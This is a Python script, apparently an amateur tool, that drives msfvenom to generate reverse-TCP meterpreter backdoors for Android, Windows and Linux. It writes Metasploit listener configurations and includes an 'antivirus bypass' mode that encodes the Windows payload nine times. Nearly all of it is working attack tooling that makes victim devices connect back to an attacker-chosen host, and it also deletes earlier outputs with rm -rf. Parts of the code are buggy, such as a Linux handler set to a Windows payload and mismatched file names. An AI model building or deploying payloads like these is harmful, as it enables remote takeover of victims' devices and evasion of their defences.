import os
import sys
import time
def check():
    if (os.path.exists("android.apk")):
        os.system("rm -rf android.apk")
        print("deelet susses android.apk")
        #---------------------------------------------------
def check1():
    if (os.path.exists("window.exe")):
        os.system("rm -rf window.exe")
        print(f"file delete window.exe")
        #----------------------------------------------------
def check2():
    if (os.path.exists("linux.bin")):
        os.system("rm -rf linux.bin")
        print("file delete susses linux.bin") 
        #-----------------------------------------------------   
def check3():
    if (os.path.exists("winodowkill.exe")):
        os.system("rm -rf winodowkill.exe")
        print("file delete winodowkill.exe")
        #-----------------------------------------------------
def android ():
     ip = input('Enter ip address :-')
     port = input("Enter a port nomber  :-")
     handler = ("use exploit/multi/handler")
     msc = ("set payload android/meterpreter/reverse_tcp")
     lhost = (f"set lhost {ip}")
     lport = (f"set lport {port}")
     try:
         os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port}  -o android.apk")
     except:
         print("plase install metasploit fremwork")
     with open("android.txt",'w') as andp:
        andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
        time.sleep(5)
        print(" run commnad sudo  msfconsole -r android.txt")
 # ====================================================       
def windows():        
     ip = input('Enter ip address :-')
     port = input("Enter a port nomber  :-")
     handler = ("use exploit/multi/handler")
     msc = ("set payload windows/meterpreter/reverse_tcp")
     lhost = (f"set lhost {ip}")
     lport = (f"set lport {port}")
     try:
         os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={ip} lport={port}  -f exe -o window.exe")
     except:
         print("plase install metasploit fremwork")
     with open("windows.txt",'w') as andp:
        andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
        time.sleep(5)
        print("run command sudo msfconsole -r windows.txt")
# ======================================        
def linux():        
     ip = input('Enter ip address :-')
     port = input("Enter a port number  :-")
     handler = ("use exploit/multi/handler")
     msc = ("set payload windows/meterpreter/reverse_tcp")
     lhost = (f"set lhost {ip}")
     lport = (f"set lport {port}")
     try:
         os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp  lhost={ip} lport={port}  -f elf -o linux.bin")
     except:
         print("plase install metasploit fremwork")
     with open("linux.txt",'w') as andp:
        andp.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
        time.sleep(5)     
        print("run command sudo  msfconsole -r linux.txt")
 # ============================================================       
#antiviruse kill 
def windowkill():
    ip = input("enter ip address :-")
    port = input("enter port no :-")
    handler = ("use exploit/multi/handler")
    msc = ("set payload windows/meterpreter/reverse_tcp")
    lhost = (f"set lhost {ip}")
    lport = (f"set lport {port}")
    try:
       os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -e x86/shikata_ga_nai -i 9 -o winodowkill.exe")
    except:
         print("install metasploit fremwork")
    with open("wndowkill.txt",'w') as kill:
        kill.write(f"{handler}\n{msc}\n{lhost}\n{lport} ")
        time.sleep(5)
        print("run command sudo  msfconsole -r windowkill.txt")         #================================================
def main ():        
     print("metasploit fremwork")
     print("enter ip addres ex 127.0.0.1")
     print("enter port ex 8080")
     print()
     print("\twindows          [1]")
     print("\tlinux            [2]")
     print("\tandroid          [3]")
     print("\tantivirus bypass [4]")
     print("\texit tool        [5]")
     inp = int(input("enter a number :-"))
     if inp == 1:
        os.system("bash  windows.sh")
        check1()
        windows()
     elif inp == 2:
         os.system("bash linux.sh")
         check2()
         linux()
     elif inp == 3:
         os.system("bash  android.sh")
         check()
         android()
     elif inp == 4:
         print("windows [1]")
         print("linux   [2]")
         user = int(input("enter your choice :-"))
         if user == 1:
             os.system("bash  windowkill.sh")
             print("comming soon")
             check3()    # running
             windowkill()
         elif user == 5:
             sys.exit
     elif inp == 5:
         sys.exit()

main()              






# this tool make by khilesh
